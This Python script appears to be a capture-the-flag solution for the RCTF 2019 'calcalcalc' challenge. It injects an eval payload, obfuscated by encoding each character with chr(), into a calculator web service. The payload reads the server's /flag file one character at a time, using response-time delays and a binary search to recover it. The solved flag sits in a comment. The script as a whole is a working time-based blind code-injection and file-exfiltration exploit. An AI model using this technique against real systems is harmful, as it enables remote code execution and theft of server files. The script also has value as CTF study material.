import urllib3
import time
import requests

urllib3.disable_warnings()

def turn_chr(s):
    v = list(s)
    for i, c in enumerate(v):
        v[i] = 'chr(%d)' % ord(c)

    return '+'.join(v)

def check(pos, c):
    payload = """
    ord(open('/flag').read()[%d]) > %d and __import__('time').sleep(1.8)
    """ % (pos, c)
    payload = turn_chr(payload.strip())
    payload = 'eval(%s)' % payload
    data = {'expression': payload, 'isVip': True}
    url = 'https://calcalcalc.2019.rctf.rois.io/calculate'

    t1 = time.time()
    resp = requests.post(url, json=data)
    t2 = time.time() - t1

    print('[*] checking for %d - response time %.2f' % (c, t2))

    return t2 > 2

def search(pos):
    lo, hi = 31, 127
    mid = 0

    while hi > lo:
        mid = (lo + hi) // 2
        v = check(pos, mid)
        if v:
            lo = mid + 1
        else:
            hi = mid

    if check(pos, lo):
        lo += 1

    return lo

def main():
    # RCTF{watch_Kemurikusa_to_c4lm_d0wn}
    s = 'RCTF{watch_Kemurikus'
    for pos in range(len(s), 40):
        print('[*] POSITION #%d' % pos)
        c = search(pos)
        print('[*] got chr(%d) = %s' % (c, chr(c)))
        s += chr(c)
        print('[*] s = %s' % s)

    print('[*] s = %s' % s)

if __name__ == '__main__':
    main()
